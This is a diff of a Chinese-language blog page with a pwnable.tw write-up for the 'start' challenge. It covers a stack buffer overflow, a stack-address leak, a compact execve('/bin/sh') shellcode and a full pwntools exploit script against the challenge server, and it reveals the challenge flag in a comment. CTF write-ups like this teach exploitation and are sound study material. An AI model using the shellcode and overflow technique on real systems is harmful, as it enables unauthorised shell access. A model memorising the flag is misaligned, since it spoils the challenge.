@@ -13,17 +13,19 @@
     <meta name="description" content="包含 start、orw、CVE-2018-1160、calc、3x17">
 <meta property="og:type" content="article">
 <meta property="og:title" content="pwnable.tw write-up (一)">
-<meta property="og:url" content="https://skysoul1024.github.io/2024/08/08/pwnable-tw-writeup-1/index.html">
+<meta property="og:url" content="https://skysoul1024.github.io/2024/08/08/pwnable-tw-write-up-1/index.html">
 <meta property="og:site_name" content="skysoul1024&#39;s blog">
 <meta property="og:description" content="包含 start、orw、CVE-2018-1160、calc、3x17">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://i.imgur.com/e4VHND4.png">
 <meta property="og:image" content="https://i.imgur.com/Dj28gPE.png">
-<meta property="og:image" content="https://i.imgur.com/tSscdWz.png">
-<meta property="og:image" content="https://i.imgur.com/jiKwzi0.png">
-<meta property="og:image" content="https://i.imgur.com/cWEJ4OL.png">
+<meta property="og:image" content="https://i.imgur.com/L2l3d1C.png">
+<meta property="og:image" content="https://i.imgur.com/b7P25px.png">
+<meta property="og:image" content="https://i.imgur.com/eXVKNoL.png">
+<meta property="og:image" content="https://i.imgur.com/W54kMDY.png">
+<meta property="og:image" content="https://i.imgur.com/bMsp33H.png">
 <meta property="article:published_time" content="2024-08-07T16:33:14.000Z">
-<meta property="article:modified_time" content="2024-08-08T09:14:29.624Z">
+<meta property="article:modified_time" content="2024-08-08T12:55:40.890Z">
 <meta property="article:author" content="skysoul1024">
 <meta property="article:tag" content="Pwn">
 <meta name="twitter:card" content="summary">
@@ -293,7 +295,7 @@
 
                 <!-- 文章字数统计 -->
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">525</span>Reading time: <span class="post-count reading-time">2 min</span></span>
+                        <span>Word count: <span class="post-count word-count">812</span>Reading time: <span class="post-count reading-time">3 min</span></span>
                     </div>
                 <div class="post-intro-meta">
                     <!-- 撰写日期 -->
@@ -459,34 +461,47 @@
 <li>0x8048099 這裡只會將 stack + 20，而 read 會讀 60，意思是我們有 <strong>BOF</strong> 可以利用，且這題沒有開 NX，所以可以直接 <strong>ret2shellcode</strong></li>
 </ul>
 <h2 id="Stack-Frame"><a href="#Stack-Frame" class="headerlink" title="Stack Frame"></a>Stack Frame</h2><p>直接用 pwndbg 觀察 stack 可以更清楚的了解 payload 該怎麼填。</p>
-<p>下圖是程式剛執行 sys_write 後 stack 的樣子。<br><img src="https://i.imgur.com/tSscdWz.png" alt="Imgur" style="display: block; margin-left: 0;"></p>
+<p>下圖是用 gdb 去觀測程式，stack 狀態是還沒 read 寫到 stack 前。<br><img src="https://i.imgur.com/L2l3d1C.png" alt="Imgur" style="display: block; margin-left: 0;"></p>
 <ul>
-<li>0xffc3c368 是 return address，正常執行會跳到 exit</li>
-<li>只要把 0xffc3c368 這個位置覆蓋掉就可以控制執行流程</li>
+<li>0xffefc4d8 是 return address，正常執行會跳到 exit</li>
+<li>只要把 0xffefc4d8 這個位置覆蓋掉就可以控制執行流程</li>
 </ul>
 <h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>目標確定後，開始思考 exploit 流程，總共三個步驟。</p>
 <ol>
 <li>決定第一次 read 覆蓋 return address 的位置，目標是指到 shellcode 的位置，所以首先需要知道 stack address。可以利用程式中的 write 印出 stack address，因此 return address 覆蓋為 write 的執行位置 (0x8048087)</li>
-<li>寫 shellcode，並將 return address 指到 shellcode 的位置</li>
+<li>第二次 read 要寫 shellcode，並將 return address 指到 shellcode 的位置</li>
 <li>Get Shell!</li>
 </ol>
 <h3 id="為什麼第一步重新執行一次-write-就可以取得-stack-address"><a href="#為什麼第一步重新執行一次-write-就可以取得-stack-address" class="headerlink" title="為什麼第一步重新執行一次 write 就可以取得 stack address?"></a>為什麼第一步重新執行一次 write 就可以取得 stack address?</h3><p>首先要知道每次執行程式，stack address 都會不一樣。</p>
-<p>回頭看 assembly，執行完 read 後，會執行 <code>.text:08048099                 add     esp, 20</code>，所以 esp 會到 return address 的位置<br><img src="https://i.imgur.com/jiKwzi0.png" alt="Imgur" style="display: block; margin-left: 0;"></p>
+<p>回頭看 assembly，執行完 read 後，會執行 <code>.text:08048099                 add     esp, 20</code>，所以 esp 會到 return address 的位置<br><img src="https://i.imgur.com/b7P25px.png" alt="Imgur" style="display: block; margin-left: 0;"></p>
+<p>接著執行 ret，ret &#x3D; pop eip，因此 esp 執行完 ret 後變成 0xffefc4dc<br><img src="https://i.imgur.com/eXVKNoL.png" alt="Imgur" style="display: block; margin-left: 0;"></p>
 <ul>
-<li>這時候執行 ret，ret &#x3D; pop eip，因此 esp 執行完 ret 後變成 0xffc3c36c</li>
 <li>write 的 ecx 是這樣寫的 <code>.text:08048087                 mov     ecx, esp</code></li>
 </ul>
-<p>因此再執行一次 write，就會印出 0xffc3c36c 的 value &#x3D; 0xffc3c370</p>
-<!-- <img src="https://i.imgur.com/cWEJ4OL.png" alt="Imgur" style="display: block; margin-left: 0;"> -->
+<p>因此再執行一次 write，就會印出 0xffefc4dc 的 value &#x3D; 0xffefc4e0</p>
+<!-- 需要一張 add esp 前、一張 add esp 後、一張第一次覆蓋後、一張第二次覆蓋後 -->
+
+<h3 id="第二次-read-的-return-address-要填多少"><a href="#第二次-read-的-return-address-要填多少" class="headerlink" title="第二次 read 的 return address 要填多少?"></a>第二次 read 的 return address 要填多少?</h3><p>知道 stack address 後，這次可以將目標指到 shellcode 的位置了。</p>
+<p>上一步已知 esp &#x3D; 0xffefc4dc，從這接著寫下去。因為 read 後面 esp 會 + 20，所以 payload 要先塞 20 的 padding。<br>然後 stack 就會到 return address 的地方。shellcode 我會直接接著 return address 後寫下去，所以 return address 就是當前 esp + 20 + 4。</p>
+<ul>
+<li>因為 write 出來的 value 本身就會 + 4，所以寫 exploitation 時只要 + 20<img src="https://i.imgur.com/W54kMDY.png" alt="Imgur" style="display: block; margin-left: 0;"></li>
+</ul>
+<p>這樣 ret 後就能成功指到 shellcode 的位置。<br><img src="https://i.imgur.com/bMsp33H.png" alt="Imgur" style="display: block; margin-left: 0;"></p>
+<h3 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h3><p>最後剩下 shellcode 要寫。</p>
+<p>這題不能直接用 <code>shellcraft.i386.linux.sh()</code>，可以試著去印看看 <code>shellcraft.i386.linux.sh()</code> 的長度，會發現要 44。而這題只有 36 能運用。</p>
+<p>所以需要自己寫 shellcode，或是網路上找別人寫的。</p>
+<h3 id="Script"><a href="#Script" class="headerlink" title="Script"></a>Script</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">shellcode = &#x27;&#x27;&#x27;</span><br><span class="line">mov eax, 0xb</span><br><span class="line">push %s</span><br><span class="line">push %s</span><br><span class="line">mov ebx, esp</span><br><span class="line">xor ecx, ecx</span><br><span class="line">xor edx, edx</span><br><span class="line">int 0x80</span><br><span class="line">&#x27;&#x27;&#x27; % (u32(&#x27;/sh\x00&#x27;), u32(&#x27;/bin&#x27;))</span><br><span class="line"></span><br><span class="line">r = remote(&#x27;chall.pwnable.tw&#x27;, 10000)</span><br><span class="line"></span><br><span class="line">r.recvuntil(&#x27;:&#x27;)</span><br><span class="line">payload = b&#x27;A&#x27;*0x14 + p32(0x08048087)</span><br><span class="line">r.send(payload)</span><br><span class="line">addr = u32(r.recv()[:4])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = b&#x27;A&#x27;*0x14 + p32(addr + 20) + asm(shellcode)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
 <!-- FLAG{Pwn4bl3_tW_1s_y0ur_st4rt} -->
+
+<h1 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h1><h2 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h2><h1 id="施工中…"><a href="#施工中…" class="headerlink" title="施工中…"></a>施工中…</h1>
     </article>
     <!-- license -->
         <div class="license-wrapper">
             <p>Author：<a href="https://skysoul1024.github.io">skysoul1024</a>
-            <p>Link：<a href="https://skysoul1024.github.io/2024/08/08/pwnable-tw-writeup-1/">https://skysoul1024.github.io/2024/08/08/pwnable-tw-writeup-1/</a>
-            <p>Publish date：<a href="https://skysoul1024.github.io/2024/08/08/pwnable-tw-writeup-1/">August 8th 2024, 12:33:14 am</a>
-            <p>Update date：<a href="https://skysoul1024.github.io/2024/08/08/pwnable-tw-writeup-1/">August 8th 2024, 5:14:29 pm</a>
+            <p>Link：<a href="https://skysoul1024.github.io/2024/08/08/pwnable-tw-write-up-1/">https://skysoul1024.github.io/2024/08/08/pwnable-tw-write-up-1/</a>
+            <p>Publish date：<a href="https://skysoul1024.github.io/2024/08/08/pwnable-tw-write-up-1/">August 8th 2024, 12:33:14 am</a>
+            <p>Update date：<a href="https://skysoul1024.github.io/2024/08/08/pwnable-tw-write-up-1/">August 8th 2024, 8:55:40 pm</a>
             <p>License：<a rel="license noopener" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"></a>This article is licensed under<a rel="license noopener" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0</a></p>
         </div>
     <!-- paginator -->
@@ -551,7 +566,7 @@
                 <div class="toc-catalog">
                     <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
                 </div>
-                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Start"><span class="toc-number">1.</span> <span class="toc-text">Start</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stack-Frame"><span class="toc-number">1.2.</span> <span class="toc-text">Stack Frame</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">1.3.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%82%BA%E4%BB%80%E9%BA%BC%E7%AC%AC%E4%B8%80%E6%AD%A5%E9%87%8D%E6%96%B0%E5%9F%B7%E8%A1%8C%E4%B8%80%E6%AC%A1-write-%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%8F%96%E5%BE%97-stack-address"><span class="toc-number">1.3.1.</span> <span class="toc-text">為什麼第一步重新執行一次 write 就可以取得 stack address?</span></a></li></ol></li></ol></li></ol>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Start"><span class="toc-number">1.</span> <span class="toc-text">Start</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stack-Frame"><span class="toc-number">1.2.</span> <span class="toc-text">Stack Frame</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">1.3.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%82%BA%E4%BB%80%E9%BA%BC%E7%AC%AC%E4%B8%80%E6%AD%A5%E9%87%8D%E6%96%B0%E5%9F%B7%E8%A1%8C%E4%B8%80%E6%AC%A1-write-%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%8F%96%E5%BE%97-stack-address"><span class="toc-number">1.3.1.</span> <span class="toc-text">為什麼第一步重新執行一次 write 就可以取得 stack address?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AC%A1-read-%E7%9A%84-return-address-%E8%A6%81%E5%A1%AB%E5%A4%9A%E5%B0%91"><span class="toc-number">1.3.2.</span> <span class="toc-text">第二次 read 的 return address 要填多少?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shellcode"><span class="toc-number">1.3.3.</span> <span class="toc-text">Shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Script"><span class="toc-number">1.3.4.</span> <span class="toc-text">Script</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#orw"><span class="toc-number">2.</span> <span class="toc-text">orw</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%BD%E5%B7%A5%E4%B8%AD%E2%80%A6"><span class="toc-number">3.</span> <span class="toc-text">施工中…</span></a></li></ol>
             </div>
         <!-- sidebar -->
         <div class="sidebar sidebar-hide">
@@ -576,7 +591,7 @@
             <ul class="year-list">
         <li class="archive-post-item">
             <span class="archive-post-date">08/08</span>
-            <a class="archive-post-title" href="/2024/08/08/pwnable-tw-writeup-1/">pwnable.tw write-up (一)</a>
+            <a class="archive-post-title" href="/2024/08/08/pwnable-tw-write-up-1/">pwnable.tw write-up (一)</a>
         </li>
         <li class="archive-post-item">
             <span class="archive-post-date">08/07</span>
